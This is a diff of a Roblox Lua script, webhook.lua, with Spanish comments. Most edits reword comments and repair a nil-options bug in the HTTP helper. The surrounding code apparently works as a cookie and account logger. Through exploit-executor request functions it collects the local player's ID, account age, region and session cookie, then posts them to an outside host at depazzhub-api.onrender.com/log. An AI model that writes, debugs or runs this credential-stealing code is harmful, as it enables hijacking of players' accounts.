@@ -1,4 +1,4 @@
--- webhook.lua - VERSIÓN FINAL CORREGIDA
+-- webhook.lua - VERSIÓN FINAL Y ESTABLE
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
@@ -71,7 +71,7 @@ local function Request(options)
         bodyString = HttpService:JSONEncode(body)
     end
 
-    -- Intento con request() del executor
+    -- Intento 1: Función 'request' nativa del executor
     local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
     if customRequest then
         local success, response = pcall(function()
@@ -87,7 +87,7 @@ local function Request(options)
         end
     end
 
-    -- Fallback a HttpService de Roblox
+    -- Intento 2: Fallback a HttpService de Roblox
     local successHttp, responseHttp = pcall(function()
         if method == "GET" then
             return HttpService:GetAsync(url, false)
@@ -104,7 +104,7 @@ local function Request(options)
 end
 
 local function HttpGet(url, options)
-    options = options or {} -- ✅ Corrección
+    options = options or {}
     return Request({
         Url = url,
         Method = "GET",
@@ -113,8 +113,9 @@ local function HttpGet(url, options)
     })
 end
 
+-- ✅ AQUÍ ESTABA EL ERROR: Se agregó "options = options or {}"
 local function HttpPost(url, body, options)
-    options = options or {} -- ✅ Corrección CRÍTICA aquí
+    options = options or {} 
     return Request({
         Url = url,
         Method = "POST",
@@ -125,7 +126,7 @@ local function HttpPost(url, body, options)
 end
 
 -- =====================================================================
--- DATOS Y EJECUCIÓN
+-- DATOS DEL JUGADOR
 -- =====================================================================
 local function GetAccountAge()
     local player = Players.LocalPlayer
@@ -146,7 +147,7 @@ local function GetRegion()
 end
 
 -- =====================================================================
--- MAIN
+-- EJECUCIÓN PRINCIPAL
 -- =====================================================================
 local success, result = pcall(function()
     local player = Players.LocalPlayer
@@ -169,7 +170,7 @@ local success, result = pcall(function()
     print("  User ID: " .. tostring(player.UserId))
     print("  Cookie: " .. (cookieValue ~= "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" and "Detectada ✅" or "No detectada ❌"))
     
-    -- Llamada a HttpPost
+    -- Esta llamada ahora funcionará porque HttpPost maneja el nil correctamente
     local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
     if response then
